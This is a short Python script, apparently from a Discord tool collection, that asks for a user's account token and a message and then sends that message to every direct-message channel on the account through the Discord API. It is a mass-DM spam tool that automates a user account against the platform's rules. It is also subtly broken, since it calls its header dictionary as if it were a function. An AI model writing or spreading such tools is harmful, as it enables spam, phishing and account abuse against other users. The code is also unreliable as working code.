import asyncio
from pystyle import *
from colorama import *
import os
import time
import requests
import random

from utilities.Program.utils.utils import *


################################################################

            # discord : uhq.s
            # tiktok  : https://tiktok.com/@uhq.s
            # server  : https://discord.gg/wyUuYr9DEN
            # dev     : uhq.s
            # owner   : uhq.s

################################################################


async def dmall():
    os.system('cls')
    print(Fore.LIGHTRED_EX + """


██████╗ ███╗   ███╗     █████╗ ██╗     ██╗     
██╔══██╗████╗ ████║    ██╔══██╗██║     ██║     
██║  ██║██╔████╔██║    ███████║██║     ██║     
██║  ██║██║╚██╔╝██║    ██╔══██║██║     ██║     
██████╔╝██║ ╚═╝ ██║    ██║  ██║███████╗███████╗
╚═════╝ ╚═╝     ╚═╝    ╚═╝  ╚═╝╚══════╝╚══════╝
                                               


""")
    token = input(Fore.RED + '[#] ACCOUNT TOKEN : ')
    message = input(Fore.YELLOW + '[#] MESSAGE : ')
    header = {'Authorization': token}
    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=header(token)).json()
    for channel in channelIds:
        try:
            requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages',
            headers=header,
            data={"content": f"{message}"})
            print(f"[ {Fore.LIGHTRED_EX}#{Fore.RESET} ] ID: "+channel['id'])
        except Exception as e:
            print(f"[!] ERROR :  {e}")
    Write.Print(f"\n\nMessage envoyé à tous les amis\n", Colors.red_to_yellow, interval=0.009)

    input(Fore.LIGHTRED_EX + '\n\nPRESS ENTER TO RETURN TO MENU')